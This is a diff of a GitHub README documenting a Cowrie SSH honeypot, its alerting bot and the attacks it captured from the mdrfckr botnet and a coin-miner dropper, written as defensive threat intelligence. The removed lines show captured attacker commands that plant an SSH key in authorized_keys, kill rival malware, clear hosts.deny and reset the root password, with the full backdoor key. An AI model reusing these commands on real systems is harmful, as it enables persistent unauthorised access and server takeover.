@@ -1,283 +1,232 @@
-# 🍯 Cowrie SSH Honeypot — Production Deployment & Threat Analysis
+# 🍯 Cowrie SSH Honeypot — Production Deployment & Threat Intelligence
 
-A production-grade SSH honeypot deployed on a public-facing VPS, capturing real-world attack traffic. This project documents the full setup, automation, and findings from live threat actor activity — including the attribution of an active botnet campaign.
+> A fully operational SSH honeypot running on a public-facing Hetzner VPS, capturing real-world attack campaigns, malware samples, and attacker TTY sessions — with automated Telegram alerting and AbuseIPDB reporting.
 
------
+---
 
 ## 📋 Table of Contents
 
-- [Infrastructure Overview](#infrastructure-overview)
-- [Setup & Installation](#setup--installation)
-- [Telegram Alerting & AbuseIPDB Integration](#telegram-alerting--abuseipdb-integration)
-- [Live Findings — mdrfckr Botnet Campaign](#live-findings--mdrfckr-botnet-campaign)
+- [Overview](#overview)
+- [Infrastructure](#infrastructure)
+- [Live Honeypot Activity](#live-honeypot-activity)
+- [Telegram Alert Bot](#telegram-alert-bot)
+- [Threat Campaign: mdrfckr Botnet](#threat-campaign-mdrfckr-botnet)
+- [Captured Malware & Downloads](#captured-malware--downloads)
+- [Malware Analysis: VirusTotal](#malware-analysis-virustotal)
 - [IOC List](#ioc-list)
-- [Key Takeaways](#key-takeaways)
+- [Setup](#setup)
+- [Repository Structure](#repository-structure)
 
------
+---
 
-## Infrastructure Overview
+## Overview
 
-|Component          |Details                                     |
-|-------------------|--------------------------------------------|
-|VPS Provider       |Hetzner Cloud                               |
-|OS                 |Ubuntu 24.04 LTS                            |
-|RAM                |4 GB                                        |
-|Cowrie Installation|Native (non-Docker), systemd service        |
-|Cowrie User        |Dedicated unprivileged system user `cowrie` |
-|Port Redirect      |iptables NAT: port 22 → Cowrie port 2222    |
-|Real SSH Access    |Non-standard port (not disclosed)           |
-|Alerting           |Telegram Bot via Python systemd service     |
-|Threat Intel       |AbuseIPDB API (reputation scoring per alert)|
+This project documents a **production SSH honeypot** deployed on a real public IP, not a local lab. It captures live attack traffic from automated botnets and manual intrusion attempts worldwide.
 
------
+**Goals:**
+- Capture attacker TTY sessions and command sequences
+- Collect and analyze dropped malware samples
+- Identify and document recurring threat campaigns
+- Automate real-time alerting with IP reputation enrichment
 
-## Setup & Installation
+**Stack:** Cowrie · Python · Telegram Bot API · AbuseIPDB · Hetzner VPS · Ubuntu 24.04
 
-### 1. System Dependencies
+---
 
-```bash
-sudo apt update && sudo apt upgrade -y
-sudo apt install -y git python3-venv python3-dev libssl-dev libffi-dev \
-    build-essential libpython3-dev authbind
-```
+## Infrastructure
 
-### 2. Dedicated Cowrie User
+| Component | Details |
+|---|---|
+| **VPS Provider** | Hetzner Cloud |
+| **OS** | Ubuntu 24.04 LTS |
+| **RAM** | 4 GB |
+| **Cowrie Mode** | Native (non-Docker) |
+| **Honeypot Port** | 22 (redirected via iptables) |
+| **Real SSH Port** | Custom (not disclosed) |
+| **Additional Services** | Portainer, Nginx Proxy Manager, Uptime Kuma, Fail2Ban |
 
-```bash
-sudo adduser --disabled-password --gecos "" --shell /bin/bash cowrie
-```
+Cowrie runs natively on the host (migrated from Docker) for better log access and process isolation. Real SSH traffic is separated via `iptables` port redirection.
 
-### 3. Clone & Install Cowrie
+---
 
-```bash
-sudo su - cowrie
-git clone https://github.com/cowrie/cowrie.git
-cd cowrie
-python3 -m venv cowrie-env
-source cowrie-env/bin/activate
-pip install --upgrade pip
-pip install -r requirements.txt
-```
+## Live Honeypot Activity
 
-### 4. Configuration
+The following screenshot shows Cowrie's debug output during a live attack session — including the SSH key exchange (`curve25519-sha256`), cipher negotiation (`aes256-ctr`), and a failed login attempt with username `planka` / password `123456`.
 
-```bash
-cp etc/cowrie.cfg.dist etc/cowrie.cfg
-```
+![Cowrie Live Log](screenshots/cowrie_live_log.jpeg)
+*Real-time Cowrie log output: SSH handshake, key exchange, and failed authentication attempt captured live.*
 
-Key settings in `cowrie.cfg`:
+This level of detail allows reconstruction of exactly what an attacker's client sent — including which SSH algorithms they support, which can be used for attacker fingerprinting.
 
-```ini
-[honeypot]
-hostname = srv04
-listen_port = 2222
+---
 
-[output_jsonlog]
-enabled = true
-```
+## Telegram Alert Bot
 
-### 5. iptables NAT Rule
+All honeypot events are forwarded in real-time to a private Telegram channel via `analyze_cowrie.py`. The bot enriches each event with:
 
-Redirect incoming port 22 traffic to Cowrie’s port 2222:
+- **AbuseIPDB score** — reputation check per attacker IP
+- **Country flag** — geolocation
+- **Event type** — login attempt, successful auth, command executed
 
-```bash
-sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222
-sudo iptables-save | sudo tee /etc/iptables/rules.v4
-```
+### System Reconnaissance
 
-### 6. systemd Service
+This screenshot shows an attacker running a full automated recon script immediately after gaining access — collecting hostname, OS version, CPU info, memory, running processes, open ports, cron jobs, and more in a single command chain using `___BSEP_A1B2C3___` as a delimiter to parse output programmatically.
 
-`/etc/systemd/system/cowrie.service`:
+![Telegram Bot - Attacker Commands](screenshots/telegram_commands.jpeg)
+*Automated post-exploitation recon script captured via Telegram alert — attacker systematically enumerating the system.*
 
-```ini
-[Unit]
-Description=Cowrie SSH Honeypot
-After=network.target
+This is consistent with an automated exploitation framework, not manual hacking.
 
-[Service]
-User=cowrie
-WorkingDirectory=/home/cowrie/cowrie
-ExecStart=/home/cowrie/cowrie/cowrie-env/bin/python bin/cowrie start -n
-ExecStop=/home/cowrie/cowrie/cowrie-env/bin/python bin/cowrie stop
-Restart=always
+---
 
-[Install]
-WantedBy=multi-user.target
-```
+## Threat Campaign: mdrfckr Botnet
 
-```bash
-sudo systemctl daemon-reload
-sudo systemctl enable cowrie
-sudo systemctl start cowrie
-```
+One of the most significant findings was a **recurring botnet campaign** identified by its SSH key fingerprint `mdrfckr`. The same key was observed across multiple IPs in France 🇫🇷, China 🇨🇳, and South Korea 🇰🇷 — strongly suggesting a coordinated botnet with persistent infrastructure.
 
------
+### What the Attacker Did
 
-## Telegram Alerting & AbuseIPDB Integration
+After authentication, the attacker immediately:
+1. Cleared the `.ssh` directory
+2. Injected their own SSH public key into `authorized_keys` (persistence)
+3. Set restrictive permissions to lock out the legitimate owner
+4. Attempted further credential-based attacks from the same IP
 
-A custom Python daemon (`analyze_cowrie.py`) runs as a separate systemd service. It tails the Cowrie JSON log in real time and sends enriched alerts to a private Telegram channel.
+![Telegram Bot - mdrfckr Campaign](screenshots/telegram_mdrfckr.jpeg)
+*Telegram alert showing the mdrfckr SSH key being written to `authorized_keys` — classic persistence mechanism. Note the AbuseIPDB score of 100% for all involved IPs.*
 
-### Alert Format
+The key comment `mdrfckr` in the public key string allowed correlation across multiple sessions and IPs, turning a single event into a trackable campaign.
 
-Each alert includes:
+---
 
-- Event type (login attempt / successful login / command executed)
-- Username and password used
-- Source IP, country, and AbuseIPDB confidence score
-- Commands executed (for post-login activity)
+## Captured Malware & Downloads
 
-### AbuseIPDB Integration
+Cowrie's download capture feature saved all files that attackers attempted to fetch or execute. The files were stored with their SHA256 hashes as filenames — a common convention for malware repositories.
 
-Every source IP is checked against the AbuseIPDB API before the alert is sent. The confidence score (0–100%) is included in each message, allowing immediate triage directly from the Telegram notification.
+![Malware Downloads - Part 1](screenshots/cowrie_downloads_1.jpeg)
+*Cowrie download directory — captured binaries stored by SHA256 hash. Note file sizes ranging from small stagers (96 bytes) to full payloads (30+ MB).*
 
-### systemd Service
+![Malware Downloads - Part 2](screenshots/tty_directory.jpeg)
+*Additional captured samples — timestamps show activity across multiple days, indicating sustained campaign activity.*
 
-The bot runs as a persistent service and survives reboots:
+### Attacker Dropper Command
 
-```bash
-sudo systemctl enable analyze-cowrie
-sudo systemctl start analyze-cowrie
-```
+The following TTY session shows the full malware deployment command captured by Cowrie. The attacker uses a multi-fallback download chain (`curl` → `wget` → raw TCP socket via `/dev/tcp`) to fetch a binary from `8.222.174.150:60111`, then executes it with a base64-encoded payload argument.
 
------
+![TTY Session - Malware Dropper](screenshots/cowrie_tty_session.jpeg)
+*Full attacker TTY session: multi-stage dropper using curl/wget/dev/tcp fallback chain, followed by execution with a large base64-encoded payload — consistent with XMRig miner deployment.*
 
-## Live Findings — mdrfckr Botnet Campaign
+**Observed TTY techniques:**
+- `curl` with fallback to `wget` and raw `/dev/tcp` socket
+- Binary dropped to `/tmp/` with random filename
+- `chmod +x` followed by immediate execution
+- Base64-encoded configuration blob passed as argument (XMRig pool config)
+- Credential written to `/tmp/.opass`
 
-Shortly after deployment, the honeypot captured a coordinated, automated SSH campaign operating across multiple IPs in different countries. All activity was attributed to a single botnet based on a consistent fingerprint.
+---
 
-### Attribution
+## Malware Analysis: VirusTotal
 
-Every session shared the same RSA public key with the comment field `mdrfckr`. This is the primary IOC linking all observed IPs to a single campaign.
+Captured samples were submitted to VirusTotal for static analysis. The primary sample was identified as a **UPX-packed ELF binary** with advanced evasion techniques.
 
-### Attack Chain
+![VirusTotal Analysis](screenshots/virustotal.jpeg)
+*VirusTotal analysis of captured binary — classified as `miner.cciiu/mirai` by multiple vendors. Cynet: Malicious (score 99). Uses `memfd_create` for fileless execution.*
 
-**Phase 1 — Credential Brute-Force**
+**Key findings:**
+| Property | Value |
+|---|---|
+| **Packer** | UPX 5.0 |
+| **Family** | miner.cciiu / Mirai variant |
+| **Execution** | Fileless via `memfd_create` syscall |
+| **Fallback** | `/dev/shm` temporary file |
+| **Evasion** | Direct syscalls instead of library imports |
+| **AhnLab** | Linux/CoinMiner.Gen3 |
+| **AliCloud** | Miner:Multi/XmrigGo.SY |
+| **Cynet Score** | 99/100 (Malicious) |
 
-The botnet rotates through common username/password combinations targeting the `root` account.
+The use of `memfd_create` to unpack and execute the payload entirely in memory — with no file written to disk — represents a sophisticated evasion technique commonly seen in advanced Linux malware.
 
-**Phase 2 — SSH Persistence**
-
-Immediately after a successful login, every node executed the same command block:
-
-```bash
-# Remove immutable/append-only file attributes
-cd ~; chattr -ia .ssh
-
-# Wipe existing SSH config and plant backdoor key
-cd ~ && rm -rf .ssh && mkdir .ssh \
-&& echo "ssh-rsa AAAAB3NzaC1yc2E[...]SVKPRK+oRw== mdrfckr" >> .ssh/authorized_keys \
-&& chmod -R go= ~/.ssh
-```
-
-This establishes permanent SSH access using the attacker’s public key — independent of passwords and unaffected by password changes.
-
-**Phase 3 — Competitor Elimination**
-
-One session also executed cleanup commands designed to remove competing malware and clear access restrictions:
-
-```bash
-rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh
-pkill -9 secure.sh; pkill -9 auth.sh
-echo > /etc/hosts.deny
-pkill -9 sleep
-```
-
-This indicates the botnet is aware that compromised servers may already be infected by other actors.
-
-**Phase 4 — Post-Exploitation Reconnaissance**
-
-The same session then performed detailed hardware profiling — consistent with evaluating the server for crypto-mining viability:
-
-```bash
-# CPU core count and model
-cat /proc/cpuinfo | grep name | wc -l
-lscpu | grep Model
-
-# RAM
-free -m | grep Mem | awk '{print $2,$3,$4,$5,$6,$7}'
-
-# Disk space
-df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
-
-# Architecture and OS
-uname -m
-uname -a
-
-# Running processes and logged-in users
-top
-w
-
-# Existing cron jobs
-crontab -l
-
-# Root password change (credential takeover)
-echo "root:4N0F1GfQFwB7"|chpasswd|bash
-```
-
-**Phase 5 — Honeypot Evasion Attempt**
-
-The session also ran:
-
-```bash
-which ls
-ls -lh $(which ls)
-```
-
-This is a known technique to detect container environments and honeypots. Cowrie’s emulated responses were convincing enough that the bot continued without aborting.
-
-### Campaign Behaviour
-
-Multiple IPs across France, China, South Korea, and unregistered hosts executed identical command sequences within the same morning window. The nodes showed no awareness of each other — consistent with a distributed botnet where each node operates independently from a shared target list, without real-time coordination.
-
------
+---
 
 ## IOC List
 
-### Source IPs
+Indicators of Compromise collected during operation:
 
-|IP             |Country|AbuseIPDB Score|Notes                                                |
-|---------------|-------|---------------|-----------------------------------------------------|
-|82.97.17.167   |FR     |100%           |Phase 2 only                                         |
-|36.104.147.6   |CN     |100%           |Phase 2 only                                         |
-|106.252.57.21  |KR     |0%             |Unreported at time of capture — reported to AbuseIPDB|
-|175.123.252.126|KR     |100%           |Phase 2 only                                         |
-|14.103.228.234 |CN     |100%           |Full chain: Phase 2–5                                |
+### SSH Key Fingerprints
+| Fingerprint | Campaign |
+|---|---|
+| `mdrfckr` (key comment) | mdrfckr botnet persistence |
 
-### SSH Public Key (Backdoor)
+### Malicious IPs (AbuseIPDB Score 100%)
+| IP | Country | Activity |
+|---|---|---|
+| `50.104.70.175` | 🇺🇸 US | mdrfckr key injection, credential brute-force |
+| `187.191.2.213` | 🇲🇽 MX | Post-auth command execution |
+| `8.222.174.150` | 🇨🇳 CN | Malware C2 / payload host |
+
+### Malware Hashes (SHA256)
+> See `/downloads/` directory in Cowrie data path for full sample collection.
+
+---
+
+## Setup
+
+See [`scripts/setup_cowrie.sh`](scripts/setup_cowrie.sh) for the full automated installation script.
+
+**Quick overview:**
+
+```bash
+# 1. Clone and run setup
+git clone https://github.com/MircoSchroeder/Cowrie-Honeypot
+cd Cowrie-Honeypot
+chmod +x scripts/setup_cowrie.sh
+sudo bash scripts/setup_cowrie.sh
+
+# 2. Configure Telegram bot
+cp scripts/analyze_cowrie.example.env scripts/analyze_cowrie.env
+nano scripts/analyze_cowrie.env  # Add your bot token + chat ID
+
+# 3. Start alert bot
+python3 scripts/analyze_cowrie.py
+```
+
+**iptables redirect (port 22 → Cowrie's 2222):**
+```bash
+sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222
+sudo iptables-save > /etc/iptables/rules.v4
+```
+
+---
+
+## Repository Structure
 
 ```
-ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrT0rbMz1+5073fc
-B0x8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GV0mNx+9EuW0nvNoaJe0QXxziIg9eLBH
-pgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJ0K8rvcEmPecjdySYMb66nylAKGwCEE6WEQ
-Hmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYY
-jIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr
+Cowrie-Honeypot/
+├── README.md
+├── screenshots/
+│   ├── cowrie_live_log.jpeg        # Live Cowrie debug output
+│   ├── cowrie_downloads_1.jpeg     # Captured malware samples (part 1)
+│   ├── cowrie_downloads_2.jpeg     # Captured malware samples (part 2)
+│   ├── cowrie_tty_session.jpeg     # Full attacker TTY session
+│   ├── telegram_commands.jpeg      # Telegram alert: recon commands
+│   ├── telegram_mdrfckr.jpeg       # Telegram alert: mdrfckr campaign
+│   └── virustotal.jpeg             # VirusTotal malware analysis
+└── scripts/
+    ├── setup_cowrie.sh             # Automated Cowrie installation
+    ├── analyze_cowrie.py           # Telegram alert bot
+    └── analyze_cowrie.example.env  # Config template
 ```
 
-**Key comment:** `mdrfckr` — consistent across all observed sessions. Known campaign identifier in public threat intelligence.
+---
 
-### Credentials Observed
+## Skills Demonstrated
 
-|Username|Password     |
-|--------|-------------|
-|root    |3245gs5662d34|
-|root    |yang5202614  |
-|root    |abcABC123!@# |
-|root    |r@123456     |
+- **SSH Honeypot Deployment** — Production VPS, iptables redirection, native Cowrie
+- **Threat Intelligence** — Campaign correlation via SSH key fingerprinting across multiple IPs
+- **Malware Analysis** — Static analysis with VirusTotal, identifying UPX packing, fileless execution, miner families
+- **Python Automation** — Real-time log parsing, Telegram API integration, AbuseIPDB enrichment
+- **Linux Administration** — systemd service management, iptables, log rotation, process isolation
+- **Incident Documentation** — IOC extraction, TTY session analysis, dropper command reconstruction
 
-### Post-Exploitation Password Set
+---
 
-`root:4N0F1GfQFwB7` — observed being set via `chpasswd` during Phase 4.
-
------
-
-## Key Takeaways
-
-- **Honeypots capture full attack playbooks.** This deployment documented five distinct phases of a real campaign within hours of going live.
-- **IOC correlation enables attribution.** A single consistent artefact — the SSH key comment `mdrfckr` — was sufficient to link activity across five IPs in four countries.
-- **Botnet nodes operate independently.** Multiple nodes hit the same target without coordination, confirming distributed architecture with no real-time deduplication.
-- **Automated bots fail basic honeypot detection.** Despite running `which ls` and similar checks, the bot continued — highlighting the effectiveness of well-configured honeypot emulation against scripted attacks.
-- **Unreported IPs matter.** The 0% AbuseIPDB score on `106.252.57.21` demonstrated that active malicious hosts can remain unreported. All captured IPs were submitted to AbuseIPDB.
-
------
-
-*Deployed and maintained as part of a self-directed IT security portfolio. All findings are from a production honeypot receiving unsolicited real-world traffic.*
+*All data collected on infrastructure I own and operate. Attacker IPs have been reported to AbuseIPDB.*
